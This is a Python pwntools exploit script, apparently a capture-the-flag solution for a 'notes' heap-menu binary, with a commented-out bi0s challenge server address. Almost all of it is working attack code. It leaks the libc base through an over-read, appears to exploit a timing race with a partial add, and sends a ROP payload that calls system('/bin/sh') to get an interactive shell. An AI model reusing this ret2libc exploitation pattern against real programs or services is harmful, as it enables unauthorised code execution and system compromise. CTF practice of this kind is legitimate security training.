#!/usr/bin/env python3



from pwn import *
from time import sleep

e = ELF("./notes")
r = process("./notes")
#r = remote("pwn.chall.bi0s.in",34641)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(val,name,size,content):
    r.sendlineafter(b"Choice",b"1")
    r.sendlineafter(b"ID",f"{val}")
    r.sendafter(b"Name",name)
    r.sendlineafter(b"Size",f"{size}")
    r.sendafter(b"Content",content)
def half_add(val,name,size,content):
    r.sendline(b"1")
    r.sendlineafter(b"ID",f"{val}")
    r.sendafter(b"Name",name)
    r.sendlineafter(b"Size",f"{size}")
    r.sendafter(b"Content",content)

def print_note(val):
    r.sendlineafter(b"Choice",b"3")
    r.sendlineafter(b"ID",f"{val}")
    r.recvuntil(b"Content: ")
    r.recvuntil(b"A" * 3042)
    r.recv()
    r.recv()
    a = u64(r.recv()[-20:-14].decode('latin-1').ljust(8,'\x00')) - 0xa57c0
    return a

add(0,b"1asda",9792,b"A" * 3042)
libc_base = print_note(0)
log.info("The libc base of the process is " + hex(libc_base))
sleep(1)
half_add(1,b"Strikerr",23,b"B")
sleep(2)
add(2,b"Ajay",200,b"A" * 72 + p64(0x401bc1) + p64(0x401bc0) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system))

#    add(0,b"Strikerr",23,b"B")
#    add(1,b"Ajay",4000,b"A" * 3042) #add(2,b"Aasd",12,b"asd")
r.interactive()
